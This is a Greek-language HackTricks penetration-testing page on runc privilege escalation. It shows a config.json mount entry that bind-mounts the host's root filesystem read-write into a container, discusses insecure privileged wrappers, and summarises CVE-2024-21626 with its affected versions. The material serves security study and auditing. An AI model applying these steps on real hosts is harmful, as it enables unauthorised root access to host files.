# Κλιμάκωση προνομίων RunC

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Αν θέλετε να μάθετε περισσότερα για το **runc**, δείτε την ακόλουθη σελίδα:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Αν το `runc` είναι διαθέσιμο σε μια rootful διεργασία στον host, μπορείτε να χρησιμοποιήσετε ένα OCI bundle του οποίου η διαμόρφωση mount κάνει αναδρομικό bind-mount του `/` του host στο `/` μέσα στο container, εκθέτοντας το filesystem του host σε εκείνο το mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Η τεκμηριωμένη ροή εργασίας `runc run` εκτελείται με δικαιώματα root: στα δικά του παραδείγματα, το runc αναφέρει «run as root». Ένας μη προνομιούχος χρήστης χρειάζεται ρύθμιση rootless, όπως `runc spec --rootless`, και το runc διευκρινίζει ότι για αυτήν τη λειτουργία πρέπει να είναι ενεργοποιημένα τα user namespaces.<sup>[[1]](#references)</sup>

## Προνομιούχα wrappers και εκδόσεις runtime

Ένα προνομιούχο wrapper που δέχεται ένα OCI bundle ελεγχόμενο από τον καλούντα μπορεί να εκθέσει αρχεία του host αν επιτρέπει μη ασφαλή bind mounts. Ελέγξτε αν το wrapper επιλύει τα traversal και τα symlinks πριν επικυρώσει τις πηγές και τους προορισμούς των mounts, καθώς και αν περιορίζει το `process.cwd`. Ένας κανόνας sudo ή ένα εγγράψιμο `config.json` από μόνο του δεν αποδεικνύει ότι το wrapper θα δεχτεί το bundle ή θα το εκτελέσει με δικαιώματα host.

Ξεχωριστά, το [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) επηρέασε τις upstream εκδόσεις του `runc` από `1.0.0-rc93` έως `1.1.11`· η έκδοση `1.1.12` περιλαμβάνει τη διόρθωση upstream. Διαρροές file descriptors και ανεπαρκής επικύρωση του working directory μπορούσαν, σε ορισμένες ροές εργασίας `runc run` ή `runc exec`, να οδηγήσουν μια διεργασία container έξω από το root της. Οι αριθμοί των file descriptors εξαρτώνται από την κλήση, ενώ μια συμβολοσειρά έκδοσης δεν αποδεικνύει ότι είναι δυνατή η εκμετάλλευση, αν ένας προμηθευτής έχει κάνει backport τις διορθώσεις ή ο καλών δεν μπορεί να επηρεάσει μια προνομιούχα κλήση του runtime.

## References

- [1] [runc: Εργαλείο CLI για την εκκίνηση και εκτέλεση containers](https://github.com/opencontainers/runc#using-runc)
- [2] [Προδιαγραφή OCI Runtime: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Κοινόχρηστα subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
